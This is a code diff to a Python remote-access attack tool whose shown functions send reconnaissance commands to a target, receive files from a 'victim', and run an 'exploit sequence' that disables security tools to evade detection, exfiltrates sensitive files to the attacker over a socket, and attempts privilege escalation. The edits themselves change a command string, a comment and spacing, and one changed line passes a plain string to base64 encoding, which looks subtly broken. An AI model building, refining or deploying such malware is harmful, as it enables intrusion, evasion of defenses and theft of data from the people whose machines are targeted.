@@ -25,7 +25,7 @@ def log_output(output):
 def gather_system_info(sock):
     try:
         # Send the command to the target
-        sock.send(base64.b64encode(b"sysinfo"))
+        sock.send(base64.b64encode("uname -a && whoami && id && df -h"))
         print("[+] Sent system information request to target.")
 
         # Wait for the response from the target
@@ -106,7 +106,7 @@ def download_sensitive_files(sock):
 
 def receive_and_save_file(conn, filename):
     try:
-        save_path = os.path.join("/tmp", os.path.basename(filename)) # Define path
+        save_path = os.path.join("/tmp", os.path.basename(filename)) # Define path (otherwise will overwrite your own files)
         
         # Receive the base64 encoded file data from the victim
         file_data = conn.recv(4096)
@@ -155,6 +155,7 @@ def attempt_privilege_escalation():
 
 # One-For-All Command to leverage attack 
 def exploit_sequence(sock):
+        
         # Step 1: Disable security tools to avoid detection
         disable_output = disable_security_tools()
         sock.send(base64.b64encode(disable_output.encode()))  # Log output to the attacker
@@ -186,6 +187,7 @@ def exploit_sequence(sock):
                     file_data = base64.b64encode(f.read())
                     sock.send(file_data)
                     log_output(f"[+] Sent file {file_path}.")
+            
             except Exception as e:
                 error_message = f"[!] Error downloading {file_path}: {str(e)}"
                 sock.send(base64.b64encode(error_message.encode()))
